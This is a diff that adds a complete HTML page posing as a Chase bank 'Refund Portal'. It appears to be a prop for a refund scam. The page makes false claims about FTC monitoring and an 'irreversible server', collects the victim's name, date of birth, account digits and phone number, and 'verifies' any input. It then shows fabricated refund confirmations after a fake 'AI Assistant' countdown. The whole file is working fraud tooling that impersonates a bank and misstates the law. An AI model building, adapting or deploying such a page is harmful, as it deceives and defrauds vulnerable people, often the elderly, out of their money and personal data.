@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Refund Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+    body {
+      background: linear-gradient(to right, #ece9e6, #ffffff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px;
+    }
+    .container {
+      background: #ffffff;
+      border-radius: 20px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+      padding: 40px 50px;
+      width: 100%;
+      max-width: 650px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .step { display: none; }
+    .step.active { display: block; }
+    input {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 15px;
+      margin-bottom: 20px;
+      transition: border-color 0.3s ease;
+    }
+    input:focus {
+      outline: none;
+      border-color: #e74c3c;
+      box-shadow: 0 0 0 2px rgba(231, 76, 60, 0.3);
+    }
+    button {
+      background-color: #e74c3c; color: white; padding: 12px 20px;
+      border: none; border-radius: 8px; cursor: pointer;
+      font-weight: bold; font-size: 15px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover { background-color: #c0392b; }
+    .logo { display: flex; justify-content: center; margin-bottom: 20px; }
+    .logo img { height: 60px; }
+    .message { color: green; margin-bottom: 15px; }
+    .loader-wrapper { text-align: center; padding: 20px; }
+    .circle-container {
+      position: relative; width: 100px; height: 100px;
+      margin: 0 auto 20px auto;
+    }
+    .circle-loader {
+      border: 10px solid #e74c3c;
+      border-top: 10px solid #f1c40f;
+      border-radius: 50%;
+      width: 100px; height: 100px;
+      animation: spin 1s linear infinite;
+    }
+    .countdown-text {
+      position: absolute; top: 35px; width: 100%;
+      text-align: center; font-weight: bold;
+      color: #f1c40f;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .confirmation-page {
+      opacity: 0;
+      transform: translateY(30px);
+      animation: slideUp 1s ease-out forwards;
+      text-align: center;
+      margin-top: 30px;
+    }
+    .confirmation-page h2 {
+      color: #388e3c;
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
+    .center-button { display: flex; justify-content: center; margin-top: 30px; }
+    @keyframes slideUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .legal-line {
+      opacity: 0; transform: translateY(30px);
+      animation: slideUp 2s ease forwards;
+      font-size: 16px; color: #444; margin-bottom: 15px;
+    }
+    .legal-line:nth-child(1) { animation-delay: 0s; }
+    .legal-line:nth-child(2) { animation-delay: 2s; }
+    .legal-line:nth-child(3) { animation-delay: 4s; }
+    .legal-instructions {
+      margin-top: 20px; padding: 20px; background: #f1f9ff;
+      border-left: 4px solid #f1c40f; border-radius: 10px;
+    }
+    .legal-instructions h3 { color: #e74c3c; margin-bottom: 10px; }
+    .legal-instructions ul {
+      padding-left: 20px; line-height: 1.6; color: #333;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">
+    <img src="https://logos-world.net/wp-content/uploads/2020/11/Chase-Logo-2005-present.jpg">
+  </div>
+  <form id="formContent" onsubmit="return false;">
+    <div id="step0" class="step active">
+      <div class="legal-line">You Have to Read the below mentioned Statements loudly so that we can Record It.</div>
+      <div class="legal-instructions">
+        <h3>Kindly Note Down the Below Mentioned Instructions</h3>
+        <ul>
+          <li>1. Keep in mind this is an irreversible server. Once the data is entered, it cannot be reversed.</li>
+          <li>2. You are not allowed to use the backspace key.</li>
+          <li>3. This server is created and monitored under the Federal Trade Commission (FTC) Act of 1914. It is assumed you are submitting data with sound mind and full concentration.</li>
+        </ul>
+      </div>
+      <div class="center-button">
+        <button onclick="showStep('step1')">Continue for Refund Process</button>
+      </div>
+    </div>
+
+    <div id="step1" class="step">
+      <h3>Enter First and Last Name</h3>
+      <input id="fname" type="text" placeholder="First Name" required>
+      <input id="lname" type="text" placeholder="Last Name" required>
+      <div id="msg1" class="message"></div>
+      <button type="submit" onclick="verifyName()">Submit</button>
+    </div>
+    <div id="step2" class="step">
+      <h3>Enter Date of Birth</h3>
+      <input id="dob" type="date" required>
+      <div id="msg2" class="message"></div>
+      <button type="submit" onclick="verifyDOB()">Submit</button>
+    </div>
+    <div id="step3" class="step">
+      <h3>Enter Last 4 Digits of Account Number</h3>
+      <input id="ssn" type="text" maxlength="4" required>
+      <div id="msg3" class="message"></div>
+      <button type="submit" onclick="verifySSN()">Submit</button>
+    </div>
+    <div id="step4" class="step">
+      <h3>Enter Contact Number</h3>
+      <input id="contact" type="tel" required>
+      <div id="msg4" class="message"></div>
+      <button type="submit" onclick="verifyContact()">Submit</button>
+    </div>
+    <div id="step5" class="step">
+      <h3>Your Refund Token (Note Down)</h3>
+      <div id="token" style="font-weight:bold; font-size:16px; background:#eee; padding:10px; border-radius:6px;"></div>
+      <button onclick="proceedToAmount()">Next</button>
+    </div>
+    <div id="step6" class="step">
+      <h3>Enter Debited Amount</h3>
+      <input id="amount" type="number" required>
+      <div id="msg6" class="message"></div>
+      <button onclick="verifyAmount()">Submit</button>
+    </div>
+    <div id="step7" class="step">
+      <h3>Enter First Refund Amount</h3>
+      <input id="firstPart" type="number" required>
+      <button onclick="startRefundProcessing()">Submit</button>
+    </div>
+    <div id="processing1" class="step">
+      <div class="loader-wrapper">
+        <div class="circle-container">
+          <div class="circle-loader"></div>
+          <div class="countdown-text" id="timer1">0:30</div>
+        </div>
+        <p>Our AI Assistant is working in the background...</p>
+      </div>
+    </div>
+    <div id="confirmation1" class="step confirmation-page">
+      <h2 id="confirmationText1"></h2>
+      <div class="center-button">
+        <button onclick="showStep('step8')">Proceed to Second Refund</button>
+      </div>
+    </div>
+    <div id="step8" class="step">
+      <h3>Enter Second Refund Amount</h3>
+      <input id="secondPart" type="number" required>
+      <button onclick="startSecondRefund()">Submit</button>
+    </div>
+    <div id="processing2" class="step">
+      <div class="loader-wrapper">
+        <div class="circle-container">
+          <div class="circle-loader"></div>
+          <div class="countdown-text" id="timer2">0:30</div>
+        </div>
+        <p>Our AI Assistant is working in the background...</p>
+      </div>
+    </div>
+    <div id="finalConfirmation" class="step confirmation-page">
+      <h2 id="confirmationText2"></h2>
+    </div>
+  </form>
+</div>
+
+<script>
+let firstAmount = 0;
+let secondAmount = 0;
+
+document.addEventListener("DOMContentLoaded", () => {
+  document.getElementById("formContent").addEventListener("keydown", function (e) {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      const activeStep = document.querySelector(".step.active button");
+      if (activeStep) activeStep.click();
+    }
+  });
+});
+
+function showStep(id) {
+  document.querySelectorAll(".step").forEach(el => el.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+}
+
+function verifyName() {
+  const fname = document.getElementById("fname").value.trim();
+  const lname = document.getElementById("lname").value.trim();
+  if (fname && lname) {
+    document.getElementById("msg1").textContent = "Name verified successfully";
+    setTimeout(() => showStep("step2"), 1000);
+  }
+}
+
+function verifyDOB() {
+  const dob = document.getElementById("dob").value;
+  if (dob) {
+    document.getElementById("msg2").textContent = "Date of Birth verified successfully";
+    setTimeout(() => showStep("step3"), 1000);
+  }
+}
+
+function verifySSN() {
+  const ssn = document.getElementById("ssn").value;
+  if (ssn.length === 4) {
+    document.getElementById("msg3").textContent = "Account Number verified successfully";
+    setTimeout(() => showStep("step4"), 1000);
+  }
+}
+
+function verifyContact() {
+  const contact = document.getElementById("contact").value.trim();
+  if (contact) {
+    document.getElementById("msg4").textContent = "Contact verified successfully";
+    setTimeout(() => {
+      const token = Array(16).fill().map(() => 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.charAt(Math.floor(Math.random() * 36))).join('');
+      document.getElementById("token").textContent = token;
+      showStep("step5");
+    }, 1000);
+  }
+}
+
+function proceedToAmount() {
+  showStep("step6");
+}
+
+function verifyAmount() {
+  const amt = document.getElementById("amount").value;
+  if (amt) {
+    document.getElementById("msg6").textContent = "Debited amount verified successfully";
+    setTimeout(() => showStep("step7"), 1000);
+  }
+}
+
+function startRefundProcessing() {
+  const val = document.getElementById("firstPart").value;
+  if (val) {
+    firstAmount = val;
+    showStep("processing1");
+    runCountdown("timer1", showFirstConfirmation);
+  }
+}
+
+function startSecondRefund() {
+  const val = document.getElementById("secondPart").value;
+  if (val) {
+    secondAmount = val;
+    showStep("processing2");
+    runCountdown("timer2", showSecondConfirmation);
+  }
+}
+
+function runCountdown(timerId, callback) {
+  let seconds = 30;
+  const timerEl = document.getElementById(timerId);
+  const interval = setInterval(() => {
+    const min = Math.floor(seconds / 60);
+    const sec = seconds % 30;
+    timerEl.textContent = `${min}:${sec.toString().padStart(2, '0')}`;
+    if (--seconds < 0) {
+      clearInterval(interval);
+      callback();
+    }
+  }, 1000);
+}
+
+function showFirstConfirmation() {
+  document.getElementById("confirmationText1").textContent = `Your Amount $${firstAmount} has been refunded successfully to Your Bank Account.`;
+  showStep("confirmation1");
+}
+
+function showSecondConfirmation() {
+  document.getElementById("confirmationText2").textContent = `Your Amount $${secondAmount} has been refunded successfully to Your Bank Account.`;
+  showStep("finalConfirmation");
+}
+</script>
+</body>
+</html>
